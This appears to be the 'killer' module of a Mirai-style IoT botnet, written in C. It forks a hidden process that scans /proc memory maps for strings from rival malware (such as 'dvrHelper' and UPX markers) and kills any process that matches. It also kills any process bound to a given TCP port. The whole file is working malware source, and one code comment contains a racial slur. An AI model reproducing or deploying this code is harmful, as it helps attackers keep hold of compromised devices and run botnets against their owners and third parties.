#define _GNU_SOURCE

#ifdef WICKED_KILLER

#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

int killer_pid = 0;
char *killer_realpath;
int killer_realpath_len = 0;


void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    killer_pid = fork();
    if(killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;

    sleep(5);

    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;

    while(TRUE)
    {
        DIR *dir;
        struct dirent *file;

        table_unlock_val(TABLE_KILLER_PROC);
        if((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
        {
            break;
        }
        table_lock_val(TABLE_KILLER_PROC);

        while((file = readdir(dir)) != NULL)
        {
            if(*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char maps_path[64], *ptr_maps_path = maps_path, realpath[PATH_MAX];
            int rp_len = 0, fd = 0, pid = util_atoi(file->d_name, 10);

            scan_counter++;
            if(pid <= killer_highest_pid)
            {
                if(time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME)
                {
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if(pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1);
                }
                continue;
            }

            if(pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);

            table_unlock_val(TABLE_KILLER_PROC);
            table_unlock_val(TABLE_KILLER_MAPS);

            ptr_maps_path += util_strcpy(ptr_maps_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_maps_path += util_strcpy(ptr_maps_path, file->d_name);
            ptr_maps_path += util_strcpy(ptr_maps_path, table_retrieve_val(TABLE_KILLER_MAPS, NULL));

            table_lock_val(TABLE_KILLER_PROC);
            table_lock_val(TABLE_KILLER_MAPS);

            if(maps_scan_match(maps_path))
            {
                kill(pid, 9);
            }

            util_zero(maps_path, sizeof(maps_path));

            sleep(1);
        }

        closedir(dir);
    }
}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

    util_itoa(ntohs(port), 16, port_str);
    if(util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);
    table_unlock_val(TABLE_KILLER_TCP);

    fd = open(table_retrieve_val(TABLE_KILLER_TCP, NULL), O_RDONLY);
    if(fd == -1)
        return 0;

    while(util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while(buffer[i] != 0 && buffer[i] != ':')
            i++;

        if(buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while(buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        if(util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while(column_index < 7 && buffer[++i] != 0)
            {
                if(buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if(in_column == TRUE)
                        column_index++;

                    if(in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if(listening_state == FALSE)
                continue;

            while(buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if(util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }

    close(fd);

    if(util_strlen(inode) == 0)
    {

        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);
        table_lock_val(TABLE_KILLER_TCP);

        return 0;
    }

    if((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            if(*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if(readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if((fd_dir = opendir(path)) != NULL)
            {
                while((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if(readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if(util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);
    table_lock_val(TABLE_KILLER_TCP);

    return ret;
}

static BOOL maps_scan_match(char *path)
{
    char rdbuf[512];
    BOOL found = FALSE;
    int fd = 0, ret = 0;

    if((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(TABLE_MEM_1);
    table_unlock_val(TABLE_MEM_2);
    table_unlock_val(TABLE_MEM_3);
    table_unlock_val(TABLE_MEM_4);
    table_unlock_val(TABLE_MEM_5);
    table_unlock_val(TABLE_MEM_6);
    table_unlock_val(TABLE_MEM_7);
    table_unlock_val(TABLE_MEM_8);
    table_unlock_val(TABLE_MEM_9);
    table_unlock_val(TABLE_MEM_10);
    table_unlock_val(TABLE_MEM_11);
	table_unlock_val(TABLE_MEM_12);
	table_unlock_val(TABLE_MEM_13);
	table_unlock_val(TABLE_MEM_14);
	table_unlock_val(TABLE_MEM_15);

    while((ret = read(fd, rdbuf, sizeof(rdbuf))) > 0)
    {
        if(mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_1, NULL), util_strlen(table_retrieve_val(TABLE_MEM_1, NULL))) ||   // NiGGeR69xd
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_2, NULL), util_strlen(table_retrieve_val(TABLE_MEM_2, NULL))) ||   // UPX!
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_3, NULL), util_strlen(table_retrieve_val(TABLE_MEM_3, NULL))) ||   // sysupdater
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_4, NULL), util_strlen(table_retrieve_val(TABLE_MEM_4, NULL))) ||   // 
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_5, NULL), util_strlen(table_retrieve_val(TABLE_MEM_5, NULL))) ||   // LOLNOGTFO
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_6, NULL), util_strlen(table_retrieve_val(TABLE_MEM_6, NULL))) ||   // Connection: keep-alive
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_7, NULL), util_strlen(table_retrieve_val(TABLE_MEM_7, NULL))) ||   // 14Fa
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_8, NULL), util_strlen(table_retrieve_val(TABLE_MEM_8, NULL))) ||   // assword
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_9, NULL), util_strlen(table_retrieve_val(TABLE_MEM_9, NULL))) ||   // 
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_10, NULL), util_strlen(table_retrieve_val(TABLE_MEM_10, NULL))) || // ff4Jfg
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_11, NULL), util_strlen(table_retrieve_val(TABLE_MEM_11, NULL))) || // %d.%d.%d.%d
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_12, NULL), util_strlen(table_retrieve_val(TABLE_MEM_12, NULL))) || // Cookie:
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_13, NULL), util_strlen(table_retrieve_val(TABLE_MEM_13, NULL))) || // dvrHelper
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_14, NULL), util_strlen(table_retrieve_val(TABLE_MEM_14, NULL))) || // 
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MEM_15, NULL), util_strlen(table_retrieve_val(TABLE_MEM_15, NULL))))   // abcdefghjklmnopqrstuvw012345678
        {
            found = TRUE;
            break;
        }
    }

    table_lock_val(TABLE_MEM_1);
    table_lock_val(TABLE_MEM_2);
    table_lock_val(TABLE_MEM_3);
    table_lock_val(TABLE_MEM_4);
	table_lock_val(TABLE_MEM_5);
	table_lock_val(TABLE_MEM_6);
	table_lock_val(TABLE_MEM_7);
	table_lock_val(TABLE_MEM_8);
	table_lock_val(TABLE_MEM_9);
	table_lock_val(TABLE_MEM_10);
	table_lock_val(TABLE_MEM_11);
	table_lock_val(TABLE_MEM_12);
	table_lock_val(TABLE_MEM_13);
	table_lock_val(TABLE_MEM_14);
	table_lock_val(TABLE_MEM_15);

    close(fd);

    return found;
}

static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if(str_len > buf_len)
        return FALSE;

    while(buf_len--)
    {
        if(*buf++ == str[matches])
        {
            if(++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}

#endif
